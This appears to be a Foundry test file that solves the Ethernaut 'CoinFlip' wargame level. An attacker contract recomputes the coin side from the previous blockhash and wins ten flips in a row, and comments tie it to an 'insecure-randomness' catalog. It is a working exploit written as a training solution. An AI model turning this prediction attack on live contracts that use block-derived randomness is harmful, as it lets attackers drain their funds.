// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {CoinFlip} from "../src/levels/CoinFlip.sol";

/// Ethernaut #3 "CoinFlip" → Aegis catalog `insecure-randomness`.
/// The coin side is derived from blockhash(block.number-1) — a value any contract can read in the
/// same transaction. The attacker computes the result before guessing, so it never loses.
/// Win condition (CoinFlipFactory.validateInstance): consecutiveWins >= 10.
contract CoinFlipAttacker {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip immutable target;

    constructor(CoinFlip t) {
        target = t;
    }

    function predictAndFlip() external {
        uint256 blockValue = uint256(blockhash(block.number - 1)); // same source the level uses
        bool side = (blockValue / FACTOR) == 1;
        target.flip(side); // guaranteed correct
    }
}

contract CoinFlipTest is Test {
    function test_solve_coinFlip() public {
        CoinFlip level = new CoinFlip();
        CoinFlipAttacker att = new CoinFlipAttacker(level);

        for (uint256 i = 0; i < 10; i++) {
            vm.roll(block.number + 1); // advance a block so blockhash differs (passes lastHash guard)
            att.predictAndFlip();
        }

        assertGe(level.consecutiveWins(), 10, "CoinFlip solved");
    }
}
